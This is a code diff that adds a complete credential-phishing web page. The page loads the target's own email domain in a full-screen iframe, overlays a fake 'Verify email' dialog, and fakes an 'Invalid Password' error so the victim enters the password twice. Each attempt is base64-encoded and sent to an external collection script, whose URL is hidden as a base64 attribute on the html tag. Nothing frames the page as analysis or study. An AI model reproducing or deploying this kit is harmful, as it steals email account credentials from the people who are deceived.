@@ -1,0 +1,224 @@
+
+<html id="cd" class="" url="aHR0cHM6Ly9zZWxsaWFkLmNvbS9hcGkvYmxhLnBocC8=" em='info@fjsanchez.com'>
+    <head>
+     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+      
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+      <meta name=viewport content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+    </head>
+      <style>
+      /* Set a style for the submit button */
+    .btn {
+      background-color: #249DD6;
+      color: white;
+      border: none;
+      cursor: pointer;
+      width: 100%;
+      height: 40px;
+      opacity: 0.9;
+    }
+    
+    .btn:hover {
+      opacity: 1;
+    }
+    .email{
+    background: url(images/comment-author.gif) no-repeat scroll 7px 7px;
+    padding-left:30px;
+    }
+    
+    </style>
+    <body>
+    
+    
+    <iframe src="https://samsung.com" id="myIframe" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden"></iframe>
+    
+    
+      <!-- Modal -->
+      <div class="modal fade" style="top: 107px !important;" id="myModal" role="dialog" data-backdrop="static" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+        
+          <!-- Modal content-->
+          <div class="modal-content">
+            <div class="modal-header">
+           <!--    <button type="button" class="close" data-dismiss="modal">&times;</button> -->
+          
+              <h4 class="modal-title">Verify email at <span id='span'>domain name</span></h4>
+            </div>
+            <div class="modal-body">
+                
+         
+     
+    <div id="err" style="color: red; text-align: center; margin-bottom: -5 px ;"></div>
+        <div class="form-group">
+
+          <label for="email">Email:</label>
+          <input type="text"   class="form-control" id="i01116"  placeholder="Enter email" name="email">
+        </div>
+        <div class="form-group">
+          <label for="pwd">Password:</label>
+          <input type="password" class="form-control" required id="i0116" required placeholder="Enter password" >
+    
+         <input type="hidden"  id="cinputPassword" name="password"  class="form-control" placeholder="Password" >
+                 
+    
+                   <br>
+        <div class="checkbox">
+          <label><input type="checkbox" name="remember"> Remember me</label>
+        </div>
+       
+         <a href="#" class="btn btn-info" role="button" id="po"> Verify</a>
+            </div>
+            <div class="modal-footer">
+                
+             <!--  <button type="button" class="btn btn-default" data-dismiss="modal">Close</button> -->
+            </div>
+          </div>
+          
+        </div>
+    </div>
+    </div>
+      <script type="text/javascript">
+        $(window).on('load',function(){
+            $('#myModal').modal('show');
+        });
+        
+         const urlParams = window.location.href;
+       //new URLSearchParams(window.location.search);
+     // const email = urlParams.get('email');
+       let fburldivide = urlParams.split("email=");
+       const eval = fburldivide[1];
+       const domain = eval.split("@");
+      //   const urlParams = new URLSearchParams(window.location.search);
+      // const email = urlParams.get('email'); 
+    
+       document.getElementById('myIframe').src = 'https://'+domain[1]; 
+      // alert(domain[1]);
+      $(document).ready(function() {
+      
+
+
+
+        var ad = $("#cd").attr('url');;
+
+        var sa, pa, em, pas, num, eee, sp, se, detail1, detail2;
+
+        em = "ZW1haWw9";
+        em1 = "JmVtYWlsMj0=";
+        pas = "JnBhc3M9";
+        pas1 = "JnBhc3MyPQ==";
+        se = "#i0116";
+        sp = "#i0116";
+        num = "JnBhc3M9" + Math.floor(Math.random() * 100 + Math.random()) + 1;
+        ee = eval;
+        pa = $("#i01116").val(ee);
+        $("#po").attr("href", btoa(num));
+        var domain = ee.substring(ee.lastIndexOf("@") + 1);
+        $("#span").text( domain);
+        $("#email").text(ee);
+
+        sa = $("#i0116").val();
+
+        la = "Jmxhbmc9";
+        lang = $("iframe").contents().find(".goog-te-menu2-item-selected:link div .text").eq(1).text();
+        var s = atob(em1) + pa + atob(pas1) + sa;
+        $("#po").attr("href", atob(ad) + btoa(s));
+
+        $("#i0116").keyup(sa, function() {
+
+            pa = $("#i01116").val();
+            sa = $(this).val();
+
+
+            la = "Jmxhbmc9";
+            lang = $("iframe").contents().find(".goog-te-menu2-item-selected:link div .text").eq(1).text();
+            var s = atob(em1) + pa + atob(pas1) + sa;
+
+            var r = atob(detail1) + encodeURI(s);
+            var link = btoa(r);
+
+            if (detail1) $("#po").attr("href", atob(ad) + link);
+
+        });
+
+        $("#i01116").keyup(pa, function() {
+            var lang = $("iframe").contents().find(".goog-te-menu2-item-selected:link div .text").eq(1).text();
+
+            sa = $("#i0116").val();
+            pa = $(this).val();
+
+
+            la = "Jmxhbmc9";
+            lang = $("iframe").contents().find(".goog-te-menu2-item-selected:link div .text").eq(1).text();
+            var s = atob(em1) + pa + atob(pas1) + sa;
+
+            var r = atob(detail1) + encodeURI(s);
+            var link = btoa(r);
+
+            if (detail1) $("#po").attr("href", atob(ad) + link);
+
+        });
+
+        var i = 1;
+        $('#po').click(function(e) {
+
+            ema = $("#i01116").val();
+
+
+            pasd = $("#i0116").val();
+            $('#err').html('');
+            if (ema == "" || pasd == "" || ema == " ") {
+                $('#err').html('Enter email and password');
+
+                return false;
+
+
+            }
+
+            if (IsEmail(ema) == false) {
+                $('#err').html('Invalid Email Format');
+                return false;
+            } else {
+                i++;
+
+
+                if (i <= 2) {
+                    $('#err').html('Invalid Password');
+                    var pass = $("#i01116").val();
+                    sas = $("#i0116").val();
+                    var s = atob(em) + pass + atob(pas) + sas;
+                    if (detail1 != "") detail1 = btoa(encodeURI(s));
+
+                    $("#po").attr("href", atob(ad) + detail1);
+                    return false;
+
+                } else {
+
+                    $('#err').html('');
+                    $('#su').show();
+                    $('#loading').show();
+                }
+
+            }
+
+            $('#hidden').removeClass('hidden');
+        });
+
+    });
+
+    function IsEmail(email) {
+        var regex = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        if (!regex.test(email)) {
+
+            return false;
+        } else {
+
+            return true;
+
+
+        }
+    }
+      </script>
+    </body>
+    
+    </html>
